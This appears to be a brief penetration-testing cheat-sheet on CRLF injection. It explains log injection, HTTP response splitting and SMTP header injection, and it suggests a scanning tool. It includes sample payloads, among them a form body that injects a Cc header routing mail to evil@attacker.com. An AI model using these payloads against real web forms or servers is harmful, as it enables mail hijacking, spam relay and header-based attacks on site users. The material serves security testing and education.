# CRLF Injection

- This attack exploits improper validation of user input.
- The term CRLF consists of the names of the two control characters `Carriage Return (CR)` and `Line Feed (LF)` that mark the beginning of a new line. 
- CRLF injection thus refers to the injection of new lines in places where the beginning of a new line has a special semantic meaning and no proper sanitization is implemented.


### Log Injection

- Check if CRLF characters are logged without sanitizing.

```text
'%0d%0atest2
```

- We can inject malicious code to get RCE.


### HTTP Response Splitting

- HTTP Response Splitting is a serious vulnerability that arises when web servers reflect user input in HTTP headers without proper sanitization.
- Check if user input is reflected in header without any sanitization.
- If yes, then use CRLF injection with XSS payload. Make sure to set `Content-Type` header properly so your payload can be executed.


### SMTP Header Injection

- SMTP Header Injection, also known as Email Injection, is a vulnerability that enables attackers to inject SMTP headers.
- You can add your self to `cc`, `bcc`, `to` etc to get the email to yourself as well.
- Also add a dummy header to avoid issues.

```shell
name=tester&email=test@test.com%0d%0aCc:%20evil@attacker.com%0d%0aDummyheader:%20abc&phone=123456789&message=Hello+Admin%21
```

### Automation

- Use CRLF suite

```shell
pip3 install crlfsuite
```